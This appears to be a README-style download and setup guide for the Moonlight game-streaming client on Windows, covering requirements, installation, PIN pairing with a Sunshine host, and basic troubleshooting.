Download Moonlight for Windows

🕹️ What is Moonlight

Moonlight allows you to stream your game collection from your PC to other devices. You play your favorite games at high quality with low latency. You install the software on your Windows computer, and it acts as a client to receive video and audio from a host machine. This system works well for Windows 10 and Windows 11 users who want to play in different rooms or on different devices.

⚙️ System Requirements

Ensure your computer meets these requirements for the best experience:

  • Windows 10 or Windows 11 operating system.
  • A wired Ethernet connection is preferred to reduce lag.
  • If using Wi-Fi, use a 5GHz network connection.
  • A host computer with a compatible graphics card (NVIDIA GeForce GTX 600 series or newer).
  • The Sunshine host software installed on your gaming PC.

📥 Download and Installation

Follow these steps to set up the software on your Windows machine:

  1. Visit this page to download the latest installer: Download Moonlight Setup
  2. Locate the downloaded file in your Downloads folder.
  3. Double-click the file to start the installation process.
  4. Follow the prompts on your screen. Keep the default settings unless you have specific needs.
  5. Click Finish when the progress bar completes.

🖥️ Setting Up Your Connection

Once you finish the installation, Moonlight needs to find your host computer. Open the Moonlight application from your Start menu.

The app scans your local network for available host computers. If your host computer appears in the list, click the icon to begin the pairing process.

A window appears on your host computer showing a PIN code. Enter this PIN code into the Moonlight app on your Windows device. This establishes a secure connection between both machines.

🎮 Playing Your Games

After you pair the devices, you see a list of your installed games and applications. Click any game icon to start the stream. Moonlight opens the game on your host computer and sends the images and sound to your Windows device.

You can use your mouse, keyboard, or a game controller. Moonlight forwards these inputs to the host computer instantly.

🛠️ Troubleshooting Common Issues

If you encounter issues, check these settings:

  • Connection problems: Restart both your Windows computer and the host computer.
  • High latency: Use a wired Ethernet cable instead of Wi-Fi.
  • Low quality: Adjust the bitrate settings within the Moonlight configuration menu to match your network speed.
  • Audio issues: Ensure the host computer uses the correct audio output device.

Moonlight provides a simple way to enjoy your digital library across your home network.
